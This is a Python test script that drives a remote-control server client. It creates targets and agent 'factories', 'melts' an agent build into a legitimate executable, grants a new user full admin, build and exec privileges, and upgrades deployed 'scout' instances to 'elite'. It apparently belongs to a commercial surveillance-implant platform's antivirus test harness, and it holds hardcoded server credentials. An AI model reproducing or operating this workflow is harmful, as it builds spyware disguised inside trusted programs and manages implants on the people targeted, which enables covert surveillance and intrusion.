__author__ = 'fabrizio'

import sys, os
sys.path.append(os.path.split(os.getcwd())[0])
sys.path.append(os.getcwd())

from AVAgent import rcs_client
import traceback

def testMelt():
    logging.debug('test')
    host = "rcs-minotauro"
    user = "avmonitor"
    passwd = "avmonitorp123"
    conn = rcs_client.Rcs_client(host, user, passwd)
    logging.debug(conn.login())

    if(False):
        operation, target, factory = '51222810aef1de0f040003f9', '51222b77aef1de0f040005d0', '51222b79aef1de0f040005d4'
        config = open('assets/config.json').read()
        conn.factory_add_config(factory, config)

    else:
        operation = conn.operation('AVMonitor')
        targets = conn.targets(operation, "Mazurca")

        for t in targets:
            logging.debug("delete target: ", t)
            conn.target_delete(t)

        logging.debug("remained targets: ", conn.targets(operation, "Mazurca"))

        target = conn.target_create(operation, 'Mazurca', 'la mia musica')
        factory = conn.factory_create(
            operation, target, 'desktop', 'Bella fattoria', 'degli animali')
        logging.debug("factory: ", factory)
        # sleep(10)

        config = open('assets/config.json').read()
        conn.factory_add_config(factory, config)

        logging.debug("targets: ", targets)

    param = {'platform': 'windows',
             'binary': {'demo': False, 'admin': False},
             'melt': {'scout': True, 'admin': False, 'bit64': True, 'codec': True},
             'sign': {}
             }

    #{"admin"=>false, "bit64"=>true, "codec"=>true, "scout"=>true}
    try:
        #r = conn.build(factory, param, 'build.out')
        logging.debug("build")
        r = conn.build_melt(factory, param, 'assets/meltapp.exe', 'build.out')

    except Exception, e:
        logging.debug("DBG trace %s" % traceback.format_exc())
        logging.debug(e)

    r = conn.enum_instances(factory)
    logging.debug("instances: ", r)

    # sleep(5)
    conn.target_delete(target)
    logging.debug("'%s','%s','%s' " % (operation, target, factory))
    logging.debug(conn.logout())


def test():
    import socket
    import time

    logging.debug('test')
    host = "rcs-minotauro"
    user = "avmonitor"
    passwd = "avmonitorp123"
    conn = rcs_client.Rcs_client(host, user, passwd)
    logging.debug(conn.login())

    logging.debug(conn.server_status())

    hostname = socket.gethostname()
    logging.debug("%s %s\n" % (hostname, time.ctime()))
    target = 'VM_%s' % hostname

    operation_id, group_id = conn.operation('AVMonitor')
    logging.debug(group_id)
    privs = [
        'ADMIN', 'ADMIN_USERS', 'ADMIN_OPERATIONS', 'ADMIN_TARGETS', 'ADMIN_AUDIT', 'ADMIN_LICENSE', 'SYS', 'SYS_FRONTEND', 'SYS_BACKEND', 'SYS_BACKUP', 'SYS_INJECTORS', 'SYS_CONNECTORS', 'TECH',
        'TECH_FACTORIES', 'TECH_BUILD', 'TECH_CONFIG', 'TECH_EXEC', 'TECH_UPLOAD', 'TECH_IMPORT', 'TECH_NI_RULES', 'VIEW', 'VIEW_ALERTS', 'VIEW_FILESYSTEM', 'VIEW_EDIT', 'VIEW_DELETE', 'VIEW_EXPORT', 'VIEW_PROFILES']

    user_id = conn.user_create("avmonitor_zeno", passwd, privs, group_id)
    user = "avmonitor_zeno"
    logging.debug("user_id:  %s" % user_id)
    conn.logout()

    # login with new user
    conn = rcs_client.Rcs_client(host, user, passwd)
    logging.debug(conn.login())

    t_id = conn.target_create(operation_id, target, "Dammy")
    logging.debug("t_id:  %s" % t_id)

    targets = conn.targets(operation_id, target)
    for target_id in targets:
        logging.debug("targets:  %s" % targets)

        factories = conn.factories(target_id)
        logging.debug("factories:  %s" % factories)

        for factory_id, ident in factories:
            logging.debug("factory_id  %s" % factory_id, ident)
            instances = conn.instances(ident)
            logging.debug("instances:  %s" % instances)

            for instance_id in instances:
                logging.debug("info %s" % instance_id)
                info = conn.instance_info(instance_id)
                logging.debug(info)
                assert info['scout'] is True

                logging.debug("upgrade elite")
                res = conn.instance_upgrade(instance_id)
                logging.debug("res: %s" % res)

                info = conn.instance_info(instance_id)
                logging.debug(info)
                if res:
                    assert info['upgradable'] is True

if __name__ == "__main__":
    import logging.config
    logging.config.fileConfig('../logging.conf')
    test()